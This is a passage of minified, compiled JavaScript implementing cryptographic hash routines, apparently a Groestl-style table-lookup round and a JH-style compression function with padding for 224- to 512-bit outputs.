        u = c[4768 + (v << 2) >> 2] | 0;
        v = c[4768 + ((v | 1) << 2) >> 2] | 0;
        r = (d[a + 18 >> 0] | 0) << 1;
        q = c[4768 + (r << 2) >> 2] | 0;
        r = c[4768 + ((r | 1) << 2) >> 2] | 0;
        o = (d[a + 35 >> 0] | 0) << 1;
        n = c[4768 + (o << 2) >> 2] | 0;
        o = c[4768 + ((o | 1) << 2) >> 2] | 0;
        m = (d[m >> 0] | 0) << 1;
        l = (d[a + 61 >> 0] | 0) << 1;
        i = c[4768 + (l << 2) >> 2] | 0;
        l = c[4768 + ((l | 1) << 2) >> 2] | 0;
        h = (d[a + 14 >> 0] | 0) << 1;
        g = c[4768 + (h << 2) >> 2] | 0;
        h = c[4768 + ((h | 1) << 2) >> 2] | 0;
        f = (d[a + 31 >> 0] | 0) << 1;
        s = c[4768 + (f << 2) >> 2] | 0;
        f = c[4768 + ((f | 1) << 2) >> 2] | 0;
        e = (v << 8 | u >>> 24) ^ c[4768 + ((p | 1) << 2) >> 2] ^ (r << 16 | q >>> 16) ^ (o << 24 | n >>> 8) ^ c[4768 + (m << 2) >> 2] ^ (l >>> 24 | i << 8) ^ (h >>> 16 | g << 16) ^ (f >>> 8 | s << 24);
        c[b + 40 >> 2] = (v >>> 24 | u << 8) ^ c[4768 + (p << 2) >> 2] ^ (r >>> 16 | q << 16) ^ (o >>> 8 | n << 24) ^ c[4768 + ((m | 1) << 2) >> 2] ^ (l << 8 | i >>> 24) ^ (h << 16 | g >>> 16) ^ (f << 24 | s >>> 8);
        c[b + 44 >> 2] = e;
        e = (d[t >> 0] | 0) << 1;
        t = (d[a + 9 >> 0] | 0) << 1;
        s = c[4768 + (t << 2) >> 2] | 0;
        t = c[4768 + ((t | 1) << 2) >> 2] | 0;
        f = (d[a + 26 >> 0] | 0) << 1;
        g = c[4768 + (f << 2) >> 2] | 0;
        f = c[4768 + ((f | 1) << 2) >> 2] | 0;
        h = (d[a + 43 >> 0] | 0) << 1;
        i = c[4768 + (h << 2) >> 2] | 0;
        h = c[4768 + ((h | 1) << 2) >> 2] | 0;
        j = (d[j >> 0] | 0) << 1;
        l = (d[a + 5 >> 0] | 0) << 1;
        m = c[4768 + (l << 2) >> 2] | 0;
        l = c[4768 + ((l | 1) << 2) >> 2] | 0;
        n = (d[a + 22 >> 0] | 0) << 1;
        o = c[4768 + (n << 2) >> 2] | 0;
        n = c[4768 + ((n | 1) << 2) >> 2] | 0;
        q = (d[a + 39 >> 0] | 0) << 1;
        r = c[4768 + (q << 2) >> 2] | 0;
        q = c[4768 + ((q | 1) << 2) >> 2] | 0;
        p = (t << 8 | s >>> 24) ^ c[4768 + ((e | 1) << 2) >> 2] ^ (f << 16 | g >>> 16) ^ (h << 24 | i >>> 8) ^ c[4768 + (j << 2) >> 2] ^ (l >>> 24 | m << 8) ^ (n >>> 16 | o << 16) ^ (q >>> 8 | r << 24);
        c[b + 48 >> 2] = (t >>> 24 | s << 8) ^ c[4768 + (e << 2) >> 2] ^ (f >>> 16 | g << 16) ^ (h >>> 8 | i << 24) ^ c[4768 + ((j | 1) << 2) >> 2] ^ (l << 8 | m >>> 24) ^ (n << 16 | o >>> 16) ^ (q << 24 | r >>> 8);
        c[b + 52 >> 2] = p;
        p = (d[a >> 0] | 0) << 1;
        r = (d[a + 17 >> 0] | 0) << 1;
        q = c[4768 + (r << 2) >> 2] | 0;
        r = c[4768 + ((r | 1) << 2) >> 2] | 0;
        o = (d[a + 34 >> 0] | 0) << 1;
        n = c[4768 + (o << 2) >> 2] | 0;
        o = c[4768 + ((o | 1) << 2) >> 2] | 0;
        m = (d[a + 51 >> 0] | 0) << 1;
        l = c[4768 + (m << 2) >> 2] | 0;
        m = c[4768 + ((m | 1) << 2) >> 2] | 0;
        k = (d[k >> 0] | 0) << 1;
        j = (d[a + 13 >> 0] | 0) << 1;
        i = c[4768 + (j << 2) >> 2] | 0;
        j = c[4768 + ((j | 1) << 2) >> 2] | 0;
        h = (d[a + 30 >> 0] | 0) << 1;
        g = c[4768 + (h << 2) >> 2] | 0;
        h = c[4768 + ((h | 1) << 2) >> 2] | 0;
        f = (d[a + 47 >> 0] | 0) << 1;
        a = c[4768 + (f << 2) >> 2] | 0;
        f = c[4768 + ((f | 1) << 2) >> 2] | 0;
        e = (r << 8 | q >>> 24) ^ c[4768 + ((p | 1) << 2) >> 2] ^ (o << 16 | n >>> 16) ^ (m << 24 | l >>> 8) ^ c[4768 + (k << 2) >> 2] ^ (j >>> 24 | i << 8) ^ (h >>> 16 | g << 16) ^ (f >>> 8 | a << 24);
        c[b + 56 >> 2] = (r >>> 24 | q << 8) ^ c[4768 + (p << 2) >> 2] ^ (o >>> 16 | n << 16) ^ (m >>> 8 | l << 24) ^ c[4768 + ((k | 1) << 2) >> 2] ^ (j << 8 | i >>> 24) ^ (h << 16 | g >>> 16) ^ (f << 24 | a >>> 8);
        c[b + 60 >> 2] = e;
        return
    }

    function Ma(b, e, f, g, h) {
        b = b | 0;
        e = e | 0;
        f = f | 0;
        g = g | 0;
        h = h | 0;
        var i = 0,
            j = 0,
            k = 0,
            m = 0,
            n = 0,
            o = 0,
            p = 0,
            q = 0,
            r = 0;
        r = l;
        l = l + 224 | 0;
        q = r;
        i = b + -224 | 0;
        i = i >>> 5 | i << 27;
        switch (i | 0) {
            case 0:
            case 1:
            case 5:
            case 9:
                break;
            default:
                {
                    q = 2;l = r;
                    return q | 0
                }
        }
        p = q + 8 | 0;
        c[p >> 2] = 0;
        c[p + 4 >> 2] = 0;
        c[p + 8 >> 2] = 0;
        c[p + 12 >> 2] = 0;
        c[q >> 2] = b;
        switch (i | 0) {
            case 0:
                {
                    m = q + 32 | 0;k = 7759;n = m + 128 | 0;do {
                        a[m >> 0] = a[k >> 0] | 0;
                        m = m + 1 | 0;
                        k = k + 1 | 0
                    } while ((m | 0) < (n | 0));
                    break
                }
            case 1:
                {
                    m = q + 32 | 0;k = 7887;n = m + 128 | 0;do {
                        a[m >> 0] = a[k >> 0] | 0;
                        m = m + 1 | 0;
                        k = k + 1 | 0
                    } while ((m | 0) < (n | 0));
                    break
                }
            case 5:
                {
                    m = q + 32 | 0;k = 8015;n = m + 128 | 0;do {
                        a[m >> 0] = a[k >> 0] | 0;
                        m = m + 1 | 0;
                        k = k + 1 | 0
                    } while ((m | 0) < (n | 0));
                    break
                }
            case 9:
                {
                    m = q + 32 | 0;k = 8143;n = m + 128 | 0;do {
                        a[m >> 0] = a[k >> 0] | 0;
                        m = m + 1 | 0;
                        k = k + 1 | 0
                    } while ((m | 0) < (n | 0));
                    break
                }
            default:
                {}
        }
        o = p;
        c[o >> 2] = f;
        c[o + 4 >> 2] = g;
        o = q + 16 | 0;
        if (g >>> 0 > 0 | (g | 0) == 0 & f >>> 0 > 511) {
            i = q + 160 | 0;
            b = 0;
            j = 0;
            do {
                m = i;
                k = e + b | 0;
                n = m + 64 | 0;
                do {
                    a[m >> 0] = a[k >> 0] | 0;
                    m = m + 1 | 0;
                    k = k + 1 | 0
                } while ((m | 0) < (n | 0));
                Na(q);
                b = wb(b | 0, j | 0, 64, 0) | 0;
                j = y;
                f = wb(f | 0, g | 0, -512, -1) | 0;
                g = y
            } while (g >>> 0 > 0 | (g | 0) == 0 & f >>> 0 > 511)
        } else b = 0;
        if (!((f | 0) == 0 & (g | 0) == 0)) {
            j = q + 160 | 0;
            b = e + b | 0;
            i = yb(f | 0, g | 0, 3) | 0;
            i = i & 63;
            if ((f & 7 | 0) == 0 & 0 == 0) Db(j | 0, b | 0, i | 0) | 0;
            else {
                e = wb(i | 0, 0, 1, 0) | 0;
                Db(j | 0, b | 0, e | 0) | 0
            }
            e = o;
            c[e >> 2] = f;
            c[e + 4 >> 2] = g
        }
        j = p;
        g = c[j >> 2] | 0;
        j = c[j + 4 >> 2] | 0;
        b = g & 511;
        if ((b | 0) == 0 & 0 == 0) {
            b = q + 160 | 0;
            m = b;
            n = m + 64 | 0;
            do {
                c[m >> 2] = 0;
                m = m + 4 | 0
            } while ((m | 0) < (n | 0));
            a[b >> 0] = -128;
            a[q + 223 >> 0] = g;
            p = yb(g | 0, j | 0, 8) | 0;
            a[q + 222 >> 0] = p;
            p = yb(g | 0, j | 0, 16) | 0;
            a[q + 221 >> 0] = p;
            p = yb(g | 0, j | 0, 24) | 0;
            a[q + 220 >> 0] = p;
            a[q + 219 >> 0] = j;
            p = yb(g | 0, j | 0, 40) | 0;
            a[q + 218 >> 0] = p;
            p = yb(g | 0, j | 0, 48) | 0;
            a[q + 217 >> 0] = p;
            p = yb(g | 0, j | 0, 56) | 0;
            a[q + 216 >> 0] = p;
            Na(q)
        } else {
            o = (c[o >> 2] & 7 | 0) == 0 & 0 == 0;
            b = yb(b | 0, 0, 3) | 0;
            i = y;
            if (!o) {
                b = wb(b | 0, i | 0, 1, 0) | 0;
                if (b >>> 0 < 64) xb(q + (b + 160) | 0, 0, 64 - b | 0) | 0
            } else xb(q + (b + 160) | 0, 0, 64 - b | 0) | 0;
            m = yb(g | 0, j | 0, 3) | 0;
            m = (m & 63) + (q + 160) | 0;
            a[m >> 0] = d[m >> 0] | 0 | 1 << (g & 7 ^ 7);
            Na(q);
            m = q + 160 | 0;
            n = m + 64 | 0;
            do {
                c[m >> 2] = 0;
                m = m + 4 | 0
            } while ((m | 0) < (n | 0));
            o = c[p >> 2] | 0;
            p = c[p + 4 >> 2] | 0;
            a[q + 223 >> 0] = o;
            e = yb(o | 0, p | 0, 8) | 0;
            a[q + 222 >> 0] = e;
            e = yb(o | 0, p | 0, 16) | 0;
            a[q + 221 >> 0] = e;
            e = yb(o | 0, p | 0, 24) | 0;
            a[q + 220 >> 0] = e;
            a[q + 219 >> 0] = p;
            e = yb(o | 0, p | 0, 40) | 0;
            a[q + 218 >> 0] = e;
            e = yb(o | 0, p | 0, 48) | 0;
            a[q + 217 >> 0] = e;
            p = yb(o | 0, p | 0, 56) | 0;
            a[q + 216 >> 0] = p;
            Na(q)
        }
        p = (c[q >> 2] | 0) + -224 | 0;
        switch (p >>> 5 | p << 27 | 0) {
            case 0:
                {
                    m = h;k = q + 96 + 36 | 0;n = m + 28 | 0;do {
                        a[m >> 0] = a[k >> 0] | 0;
                        m = m + 1 | 0;
                        k = k + 1 | 0
                    } while ((m | 0) < (n | 0));q = 0;l = r;
                    return q | 0
                }
            case 1:
                {
                    m = h;k = q + 128 | 0;n = m + 32 | 0;do {
                        a[m >> 0] = a[k >> 0] | 0;
                        m = m + 1 | 0;
                        k = k + 1 | 0
                    } while ((m | 0) < (n | 0));q = 0;l = r;
                    return q | 0
                }
            case 5:
                {
                    m = h;k = q + 112 | 0;n = m + 48 | 0;do {
                        a[m >> 0] = a[k >> 0] | 0;
                        m = m + 1 | 0;
                        k = k + 1 | 0
                    } while ((m | 0) < (n | 0));q = 0;l = r;
                    return q | 0
                }
            case 9:
                {
                    m = h;k = q + 96 | 0;n = m + 64 | 0;do {
                        a[m >> 0] = a[k >> 0] | 0;
                        m = m + 1 | 0;
                        k = k + 1 | 0
                    } while ((m | 0) < (n | 0));q = 0;l = r;
                    return q | 0
                }
            default:
                {
                    q = 0;l = r;
                    return q | 0
                }
        }
        return 0
    }

    function Na(a) {
        a = a | 0;
        var b = 0,
            e = 0,
            f = 0,
            g = 0,
            h = 0,
            i = 0,
            j = 0,
            k = 0,
            l = 0,
            m = 0,
            n = 0,
            o = 0,
            p = 0,
            q = 0,
            r = 0,
            s = 0,
            t = 0,
            u = 0,
            v = 0,
            w = 0,
            x = 0,
            z = 0,
            A = 0,
            B = 0,
            C = 0,
            D = 0,
            E = 0,
            F = 0,
            G = 0,
            H = 0,
            I = 0,
            J = 0,
            K = 0,
            L = 0,
            M = 0,
            N = 0,
            O = 0,
            P = 0,
            Q = 0,
            R = 0,
            S = 0,
            T = 0,
            U = 0,
            V = 0,
            W = 0,
            X = 0,
            Y = 0,
            Z = 0,
            _ = 0,
            $ = 0,
            aa = 0,
            ba = 0,
            ca = 0,
            da = 0,
            ea = 0,
            fa = 0,
            ga = 0;
        p = a + 160 | 0;
        D = p;
        C = a + 32 | 0;
        F = C;
        E = c[F + 4 >> 2] ^ c[D + 4 >> 2];
        c[C >> 2] = c[F >> 2] ^ c[D >> 2];
        c[C + 4 >> 2] = E;
        C = a + 168 | 0;
        E = C;
        D = a + 40 | 0;
        F = D;
        g = c[F + 4 >> 2] ^ c[E + 4 >> 2];
        c[D >> 2] = c[F >> 2] ^ c[E >> 2];
        c[D + 4 >> 2] = g;
        D = a + 176 | 0;
        g = D;
        E = a + 48 | 0;
        F = E;
        h = c[F >> 2] ^ c[g >> 2];
        g = c[F + 4 >> 2] ^ c[g + 4 >> 2];
        F = E;
        c[F >> 2] = h;
        c[F + 4 >> 2] = g;
        F = a + 184 | 0;
        q = F;
        G = a + 56 | 0;
        t = G;
        r = c[t + 4 >> 2] ^ c[q + 4 >> 2];
        H = G;
        c[H >> 2] = c[t >> 2] ^ c[q >> 2];
        c[H + 4 >> 2] = r;
        H = a + 192 | 0;
        r = H;
        q = a + 64 | 0;
        t = q;
        s = c[t + 4 >> 2] ^ c[r + 4 >> 2];
        c[q >> 2] = c[t >> 2] ^ c[r >> 2];
        c[q + 4 >> 2] = s;
        q = a + 200 | 0;
        s = q;
        r = a + 72 | 0;
        t = r;
        b = c[t + 4 >> 2] ^ c[s + 4 >> 2];
        c[r >> 2] = c[t >> 2] ^ c[s >> 2];
        c[r + 4 >> 2] = b;
        r = a + 208 | 0;
        b = r;
        s = a + 80 | 0;
        t = s;
        f = c[t >> 2] ^ c[b >> 2];
        b = c[t + 4 >> 2] ^ c[b + 4 >> 2];
        t = s;
        c[t >> 2] = f;
        c[t + 4 >> 2] = b;
        t = a + 216 | 0;
        x = t;
        u = a + 88 | 0;
        z = u;
        w = c[z + 4 >> 2] ^ c[x + 4 >> 2];
        v = u;
        c[v >> 2] = c[z >> 2] ^ c[x >> 2];
        c[v + 4 >> 2] = w;
        v = a + 112 | 0;
        w = a + 120 | 0;
        x = a + 144 | 0;
        z = a + 152 | 0;
        A = 0;
        B = 0;
        do {
            i = 8271 + (A << 5) | 0;
            j = 0;
            e = 0;
            while (1) {
                K = a + 128 + (j << 3) | 0;
                da = K;
                fa = c[da >> 2] | 0;
                da = c[da + 4 >> 2] | 0;
                L = ~fa;
                n = ~da;
                o = a + 144 + (j << 3) | 0;
                $ = o;
                ba = c[$ >> 2] | 0;
                $ = c[$ + 4 >> 2] | 0;
                Y = ~ba;
                W = ~$;
                M = a + 96 + (j << 3) | 0;
                I = M;
                J = c[I >> 2] | 0;
                I = c[I + 4 >> 2] | 0;
                N = i + (j << 3) | 0;
                O = N;
                O = d[O >> 0] | d[O + 1 >> 0] << 8 | d[O + 2 >> 0] << 16 | d[O + 3 >> 0] << 24;
                N = N + 4 | 0;
                N = d[N >> 0] | d[N + 1 >> 0] << 8 | d[N + 2 >> 0] << 16 | d[N + 3 >> 0] << 24;
                S = a + 32 + (j << 3) | 0;
                T = S;
                U = c[T >> 2] ^ O & ~J;
                T = c[T + 4 >> 2] ^ N & ~I;
                l = a + 112 + (j << 3) | 0;
                V = l;
                X = c[V >> 2] | 0;
                V = c[V + 4 >> 2] | 0;
                ea = i + ((j | 2) << 3) | 0;
                Z = ea;
                Z = d[Z >> 0] | d[Z + 1 >> 0] << 8 | d[Z + 2 >> 0] << 16 | d[Z + 3 >> 0] << 24;
                ea = ea + 4 | 0;
                ea = d[ea >> 0] | d[ea + 1 >> 0] << 8 | d[ea + 2 >> 0] << 16 | d[ea + 3 >> 0] << 24;
                ga = h ^ Z & ~X;
                _ = g ^ ea & ~V;
                P = a + 64 + (j << 3) | 0;
                Q = P;
                R = c[Q >> 2] | 0;
                Q = c[Q + 4 >> 2] | 0;
                O = R & U ^ O;
                N = Q & T ^ N;
                Z = f & ga ^ Z;
                h = b & _ ^ ea;
                U = U ^ J & L;
                T = T ^ I & n;
                g = ga ^ X & Y;
                _ = _ ^ V & W;
                ga = J & ~R;
                ea = I & ~Q;
                L = ga ^ L;
                n = ea ^ n;
                ca = X & ~f;
                aa = V & ~b;
                Y = ca ^ Y;
                W = aa ^ W;
                R = R ^ U & J;
                Q = Q ^ T & I;
                k = g & X ^ f;
                m = _ & V ^ b;
                J = (ga ^ fa) & U ^ J;
                I = (ea ^ da) & T ^ I;
                X = (ca ^ ba) & g ^ X;
                V = (aa ^ $) & _ ^ V;
                U = (L | R) ^ U;
                T = (n | Q) ^ T;
                g = (k | Y) ^ g;
                b = (m | W) ^ _;
                L = J & R ^ L;
                n = I & Q ^ n;
                R = U & O ^ R;
                Q = T & N ^ Q;
                O = J ^ O;
                N = I ^ N;
                I = R ^ g;
                J = Q ^ b;
                g = O ^ k ^ g & Z;
                b = N ^ m ^ b & h;
                f = U ^ Z ^ X ^ L;
                h = T ^ h ^ V ^ n;
                k = U ^ Y ^ X & k;
                m = T ^ W ^ V & m;
                c[S >> 2] = g ^ U;
                c[S + 4 >> 2] = b ^ T;
                c[P >> 2] = f ^ R;
                c[P + 4 >> 2] = h ^ Q;
                c[M >> 2] = I ^ O ^ k;
                c[M + 4 >> 2] = J ^ N ^ m;
                c[K >> 2] = I ^ L;
                c[K + 4 >> 2] = J ^ n;
                K = zb(I | 0, J | 0, 1) | 0;
                n = y & -1431655766;
                J = yb(I | 0, J | 0, 1) | 0;
                I = a + 48 + (j << 3) | 0;
                c[I >> 2] = K & -1431655766 | J & 1431655765;
                c[I + 4 >> 2] = n | y & 1431655765;
                I = zb(g | 0, b | 0, 1) | 0;
                n = y & -1431655766;
                b = yb(g | 0, b | 0, 1) | 0;
                g = a + 80 + (j << 3) | 0;
                c[g >> 2] = I & -1431655766 | b & 1431655765;
                c[g + 4 >> 2] = n | y & 1431655765;
                g = zb(f | 0, h | 0, 1) | 0;
                n = y & -1431655766;
                h = yb(f | 0, h | 0, 1) | 0;
                c[l >> 2] = g & -1431655766 | h & 1431655765;
                c[l + 4 >> 2] = n | y & 1431655765;
                l = zb(k | 0, m | 0, 1) | 0;
                n = y & -1431655766;
                m = yb(k | 0, m | 0, 1) | 0;
                c[o >> 2] = l & -1431655766 | m & 1431655765;
                c[o + 4 >> 2] = n | y & 1431655765;
                o = wb(j | 0, e | 0, 1, 0) | 0;
                n = y;
                if (!(n >>> 0 < 0 | (n | 0) == 0 & o >>> 0 < 2)) break;
                g = G;
                b = u;
                j = 1;
                h = c[g >> 2] | 0;
                g = c[g + 4 >> 2] | 0;
                f = c[b >> 2] | 0;
                b = c[b + 4 >> 2] | 0;
                e = 0
            }
            b = wb(A | 0, B | 0, 1, 0) | 0;
            b = 8271 + (b << 5) | 0;
            e = 0;
            f = 0;
            while (1) {
                W = a + 128 + (e << 3) | 0;
                j = W;
                h = c[j >> 2] | 0;
                j = c[j + 4 >> 2] | 0;
                U = ~h;
                fa = ~j;
                ga = a + 144 + (e << 3) | 0;
                n = ga;
                l = c[n >> 2] | 0;
                n = c[n + 4 >> 2] | 0;
                o = ~l;
                J = ~n;
                T = a + 96 + (e << 3) | 0;
                V = T;
                X = c[V >> 2] | 0;
                V = c[V + 4 >> 2] | 0;
                S = b + (e << 3) | 0;
                R = S;
                R = d[R >> 0] | d[R + 1 >> 0] << 8 | d[R + 2 >> 0] << 16 | d[R + 3 >> 0] << 24;
                S = S + 4 | 0;
                S = d[S >> 0] | d[S + 1 >> 0] << 8 | d[S + 2 >> 0] << 16 | d[S + 3 >> 0] << 24;
                N = a + 32 + (e << 3) | 0;
                M = N;
                L = c[M >> 2] ^ R & ~X;
                M = c[M + 4 >> 2] ^ S & ~V;
                da = a + 112 + (e << 3) | 0;
                K = da;
                I = c[K >> 2] | 0;
                K = c[K + 4 >> 2] | 0;
                ba = b + ((e | 2) << 3) | 0;
                $ = ba;
                $ = d[$ >> 0] | d[$ + 1 >> 0] << 8 | d[$ + 2 >> 0] << 16 | d[$ + 3 >> 0] << 24;
                ba = ba + 4 | 0;
                ba = d[ba >> 0] | d[ba + 1 >> 0] << 8 | d[ba + 2 >> 0] << 16 | d[ba + 3 >> 0] << 24;
                Z = a + 48 + (e << 3) | 0;
                _ = Z;
                Y = c[_ >> 2] ^ $ & ~I;
                _ = c[_ + 4 >> 2] ^ ba & ~K;
                Q = a + 64 + (e << 3) | 0;
                P = Q;
                O = c[P >> 2] | 0;
                P = c[P + 4 >> 2] | 0;
                R = O & L ^ R;
                S = P & M ^ S;
                aa = a + 80 + (e << 3) | 0;
                ea = aa;
                ca = c[ea >> 2] | 0;
                ea = c[ea + 4 >> 2] | 0;
                $ = ca & Y ^ $;
                ba = ea & _ ^ ba;
                L = L ^ X & U;
                M = M ^ V & fa;
                Y = Y ^ I & o;
                _ = _ ^ K & J;
                g = X & ~O;
                i = V & ~P;
                U = g ^ U;
                fa = i ^ fa;
                k = I & ~ca;
                m = K & ~ea;
                o = k ^ o;
                J = m ^ J;
                O = O ^ L & X;
                P = P ^ M & V;
                ca = Y & I ^ ca;
                ea = _ & K ^ ea;
                X = (g ^ h) & L ^ X;
                V = (i ^ j) & M ^ V;
                I = (k ^ l) & Y ^ I;
                K = (m ^ n) & _ ^ K;
                L = (U | O) ^ L;
                M = (fa | P) ^ M;
                Y = (ca | o) ^ Y;
                _ = (ea | J) ^ _;
                U = X & O ^ U;
                fa = V & P ^ fa;
                O = L & R ^ O;
                P = M & S ^ P;
                R = X ^ R;
                S = V ^ S;
                V = O ^ Y;
                X = P ^ _;
                Y = R ^ ca ^ Y & $;
                _ = S ^ ea ^ _ & ba;
                $ = L ^ $ ^ I ^ U;
                ba = M ^ ba ^ K ^ fa;
                ca = L ^ o ^ I & ca;
                ea = M ^ J ^ K & ea;
                c[N >> 2] = Y ^ L;
                c[N + 4 >> 2] = _ ^ M;
                c[Q >> 2] = $ ^ O;
                c[Q + 4 >> 2] = ba ^ P;
                c[T >> 2] = V ^ R ^ ca;
                c[T + 4 >> 2] = X ^ S ^ ea;
                c[W >> 2] = V ^ U;
                c[W + 4 >> 2] = X ^ fa;
                W = zb(V | 0, X | 0, 2) | 0;
                fa = y & -858993460;
                X = yb(V | 0, X | 0, 2) | 0;
                c[Z >> 2] = W & -858993460 | X & 858993459;
                c[Z + 4 >> 2] = fa | y & 858993459;
                Z = zb(Y | 0, _ | 0, 2) | 0;
                fa = y & -858993460;
                _ = yb(Y | 0, _ | 0, 2) | 0;
                c[aa >> 2] = Z & -858993460 | _ & 858993459;
                c[aa + 4 >> 2] = fa | y & 858993459;
                aa = zb($ | 0, ba | 0, 2) | 0;
                fa = y & -858993460;
                ba = yb($ | 0, ba | 0, 2) | 0;
                c[da >> 2] = aa & -858993460 | ba & 858993459;
                c[da + 4 >> 2] = fa | y & 858993459;
                da = zb(ca | 0, ea | 0, 2) | 0;
                fa = y & -858993460;
                ea = yb(ca | 0, ea | 0, 2) | 0;
                c[ga >> 2] = da & -858993460 | ea & 858993459;
                c[ga + 4 >> 2] = fa | y & 858993459;
                ga = wb(e | 0, f | 0, 1, 0) | 0;
                fa = y;
                if (fa >>> 0 < 0 | (fa | 0) == 0 & ga >>> 0 < 2) {
                    e = 1;
                    f = 0
                } else break
            }
            b = wb(A | 0, B | 0, 2, 0) | 0;
            b = 8271 + (b << 5) | 0;
            e = 0;
            f = 0;
            while (1) {
                W = a + 128 + (e << 3) | 0;
                j = W;
                h = c[j >> 2] | 0;
                j = c[j + 4 >> 2] | 0;
                U = ~h;
                fa = ~j;
                ga = a + 144 + (e << 3) | 0;
                n = ga;
                l = c[n >> 2] | 0;
                n = c[n + 4 >> 2] | 0;
                o = ~l;
                J = ~n;
                T = a + 96 + (e << 3) | 0;
                V = T;
                X = c[V >> 2] | 0;
                V = c[V + 4 >> 2] | 0;
                S = b + (e << 3) | 0;
                R = S;
                R = d[R >> 0] | d[R + 1 >> 0] << 8 | d[R + 2 >> 0] << 16 | d[R + 3 >> 0] << 24;
                S = S + 4 | 0;
                S = d[S >> 0] | d[S + 1 >> 0] << 8 | d[S + 2 >> 0] << 16 | d[S + 3 >> 0] << 24;
                N = a + 32 + (e << 3) | 0;
                M = N;
                L = c[M >> 2] ^ R & ~X;
                M = c[M + 4 >> 2] ^ S & ~V;
                da = a + 112 + (e << 3) | 0;
                K = da;
                I = c[K >> 2] | 0;
                K = c[K + 4 >> 2] | 0;
                ba = b + ((e | 2) << 3) | 0;
                $ = ba;
                $ = d[$ >> 0] | d[$ + 1 >> 0] << 8 | d[$ + 2 >> 0] << 16 | d[$ + 3 >> 0] << 24;
                ba = ba + 4 | 0;
                ba = d[ba >> 0] | d[ba + 1 >> 0] << 8 | d[ba + 2 >> 0] << 16 | d[ba + 3 >> 0] << 24;
                Z = a + 48 + (e << 3) | 0;
                _ = Z;
                Y = c[_ >> 2] ^ $ & ~I;
                _ = c[_ + 4 >> 2] ^ ba & ~K;
                Q = a + 64 + (e << 3) | 0;
                P = Q;
                O = c[P >> 2] | 0;
                P = c[P + 4 >> 2] | 0;
                R = O & L ^ R;
                S = P & M ^ S;
                aa = a + 80 + (e << 3) | 0;
                ea = aa;
                ca = c[ea >> 2] | 0;
                ea = c[ea + 4 >> 2] | 0;
                $ = ca & Y ^ $;
                ba = ea & _ ^ ba;
                L = L ^ X & U;
                M = M ^ V & fa;
                Y = Y ^ I & o;
                _ = _ ^ K & J;
                g = X & ~O;
                i = V & ~P;
                U = g ^ U;
                fa = i ^ fa;
                k = I & ~ca;
                m = K & ~ea;
                o = k ^ o;
                J = m ^ J;
                O = O ^ L & X;
                P = P ^ M & V;
                ca = Y & I ^ ca;
                ea = _ & K ^ ea;
                X = (g ^ h) & L ^ X;
                V = (i ^ j) & M ^ V;
                I = (k ^ l) & Y ^ I;
                K = (m ^ n) & _ ^ K;
                L = (U | O) ^ L;
                M = (fa | P) ^ M;
                Y = (ca | o) ^ Y;
                _ = (ea | J) ^ _;
                U = X & O ^ U;
                fa = V & P ^ fa;
                O = L & R ^ O;
                P = M & S ^ P;
                R = X ^ R;
                S = V ^ S;
                V = O ^ Y;
                X = P ^ _;
                Y = R ^ ca ^ Y & $;
                _ = S ^ ea ^ _ & ba;
                $ = L ^ $ ^ I ^ U;
                ba = M ^ ba ^ K ^ fa;
                ca = L ^ o ^ I & ca;
                ea = M ^ J ^ K & ea;
                c[N >> 2] = Y ^ L;
                c[N + 4 >> 2] = _ ^ M;
                c[Q >> 2] = $ ^ O;
                c[Q + 4 >> 2] = ba ^ P;
                c[T >> 2] = V ^ R ^ ca;
                c[T + 4 >> 2] = X ^ S ^ ea;
                c[W >> 2] = V ^ U;
                c[W + 4 >> 2] = X ^ fa;
                W = zb(V | 0, X | 0, 4) | 0;
                fa = y & -252645136;
                X = yb(V | 0, X | 0, 4) | 0;
                c[Z >> 2] = W & -252645136 | X & 252645135;
                c[Z + 4 >> 2] = fa | y & 252645135;
                Z = zb(Y | 0, _ | 0, 4) | 0;
                fa = y & -252645136;
                _ = yb(Y | 0, _ | 0, 4) | 0;
                c[aa >> 2] = Z & -252645136 | _ & 252645135;
                c[aa + 4 >> 2] = fa | y & 252645135;
                aa = zb($ | 0, ba | 0, 4) | 0;
                fa = y & -252645136;
                ba = yb($ | 0, ba | 0, 4) | 0;
                c[da >> 2] = aa & -252645136 | ba & 252645135;
                c[da + 4 >> 2] = fa | y & 252645135;
                da = zb(ca | 0, ea | 0, 4) | 0;
                fa = y & -252645136;
                ea = yb(ca | 0, ea | 0, 4) | 0;
                c[ga >> 2] = da & -252645136 | ea & 252645135;
                c[ga + 4 >> 2] = fa | y & 252645135;
                ga = wb(e | 0, f | 0, 1, 0) | 0;
                fa = y;
                if (fa >>> 0 < 0 | (fa | 0) == 0 & ga >>> 0 < 2) {
                    e = 1;
                    f = 0
                } else break
            }
            e = wb(A | 0, B | 0, 3, 0) | 0;
            e = 8271 + (e << 5) | 0;
            b = 0;
            f = 0;
            while (1) {
                W = a + 128 + (f << 3) | 0;
                j = W;
                h = c[j >> 2] | 0;
                j = c[j + 4 >> 2] | 0;
                U = ~h;
                fa = ~j;
                ga = a + 144 + (f << 3) | 0;
                n = ga;
                l = c[n >> 2] | 0;
                n = c[n + 4 >> 2] | 0;
                o = ~l;
                J = ~n;
                T = a + 96 + (f << 3) | 0;
                V = T;
                X = c[V >> 2] | 0;
                V = c[V + 4 >> 2] | 0;
                S = e + (f << 3) | 0;
                R = S;
                R = d[R >> 0] | d[R + 1 >> 0] << 8 | d[R + 2 >> 0] << 16 | d[R + 3 >> 0] << 24;
                S = S + 4 | 0;
                S = d[S >> 0] | d[S + 1 >> 0] << 8 | d[S + 2 >> 0] << 16 | d[S + 3 >> 0] << 24;
                N = a + 32 + (f << 3) | 0;
                M = N;
                L = c[M >> 2] ^ R & ~X;
                M = c[M + 4 >> 2] ^ S & ~V;
                da = a + 112 + (f << 3) | 0;
                K = da;
                I = c[K >> 2] | 0;
                K = c[K + 4 >> 2] | 0;
                ba = e + ((f | 2) << 3) | 0;
                $ = ba;
                $ = d[$ >> 0] | d[$ + 1 >> 0] << 8 | d[$ + 2 >> 0] << 16 | d[$ + 3 >> 0] << 24;
                ba = ba + 4 | 0;
                ba = d[ba >> 0] | d[ba + 1 >> 0] << 8 | d[ba + 2 >> 0] << 16 | d[ba + 3 >> 0] << 24;
                Z = a + 48 + (f << 3) | 0;
                _ = Z;
                Y = c[_ >> 2] ^ $ & ~I;
                _ = c[_ + 4 >> 2] ^ ba & ~K;
                Q = a + 64 + (f << 3) | 0;
                P = Q;
                O = c[P >> 2] | 0;
                P = c[P + 4 >> 2] | 0;
                R = O & L ^ R;
                S = P & M ^ S;
                aa = a + 80 + (f << 3) | 0;
                ea = aa;
                ca = c[ea >> 2] | 0;
                ea = c[ea + 4 >> 2] | 0;
                $ = ca & Y ^ $;
